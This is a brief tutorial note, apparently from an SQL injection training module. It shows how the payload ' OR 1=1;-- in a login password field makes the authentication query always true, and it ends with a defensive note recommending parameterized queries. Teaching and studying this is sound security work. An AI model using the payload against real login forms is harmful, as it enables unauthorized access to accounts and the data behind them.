# Blind SQL Injection Authentication Bypass

Used on: **SQL Injection Fundamentals**

Blind SQL injection still works even when query results and database errors are not shown. For login bypasses, the goal is not to know a valid password; it is to make the authentication predicate evaluate to true.

## When to Use

- Application does not display database errors or query output on the page.
- Submitting an SQL comment (`' OR 1=1;--`) into a login field grants access.
- Valid authentication is determined solely by the query returning one or more rows.

## Prerequisites

- A login query concatenates user-controlled input into SQL.
- The application grants access when the query returns at least one row.
- Comments are accepted by the backend SQL dialect.

## Authentication Bypass

Original query shape:

<!-- cmd: sql -->
```sql
SELECT * FROM users WHERE username='%username%' AND password='%password%' LIMIT 1;
```

Payload in the password field:

<!-- cmd: sql -->
```sql
' OR 1=1;--
```

Resulting logic:

<!-- cmd: sql -->
```sql
SELECT * FROM users WHERE username='' AND password='' OR 1=1;
```

`1=1` is always true, and `--` comments the remainder of the query so trailing syntax does not break execution.

## Defensive Note

Use parameterized queries and do not treat row existence as proof of authentication unless the password comparison is performed safely against a stored verifier.